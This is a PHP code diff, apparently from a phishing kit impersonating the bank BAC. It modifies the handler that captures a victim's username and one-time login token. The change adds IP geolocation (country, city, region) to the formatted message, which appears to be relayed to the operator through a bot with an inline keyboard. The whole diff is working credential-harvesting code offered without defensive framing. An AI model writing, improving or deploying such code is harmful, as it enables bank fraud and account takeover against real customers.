@@ -16,18 +16,19 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['resend_token'])) {
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['token'])) {
     $tk    = trim($_POST['token']);
     $round = intval($_POST['round'] ?? 1);
-    $ip    = '';
-    foreach (['HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','HTTP_X_REAL_IP','REMOTE_ADDR'] as $h) {
-        if (!empty($_SERVER[$h])) { $ip = trim(explode(',', $_SERVER[$h])[0]); break; }
-    }
-    $date = date('d/m/Y H:i:s');
+    $ip  = client_ip() ?: '?';
+    $geo = geo_lookup($ip);
 
     $msg  = "🔐 BAC — TOKEN #{$round}\n";
     $msg .= "━━━━━━━━━━━━━━━━━━━━━\n";
     $msg .= "👤 Usuario: {$usuario}\n";
     $msg .= "🔑 Token: {$tk}\n";
-    $msg .= "🌐 IP: " . ($ip ?: '?') . "\n";
-    $msg .= "🕒 Fecha: {$date}\n";
+    $msg .= "🌐 IP: {$ip}\n";
+    $msg .= ($geo['flag'] ?: '📍') . " País: " . $geo['country'];
+    if ($geo['country_code']) $msg .= " ({$geo['country_code']})";
+    $msg .= "\n";
+    $ubic = trim(($geo['city'] ? $geo['city'] . ', ' : '') . ($geo['region'] ?: ''), ', ');
+    if ($ubic) $msg .= "🏙 Ubicación: {$ubic}\n";
 
     $keyboard = json_encode([
         'inline_keyboard' => [
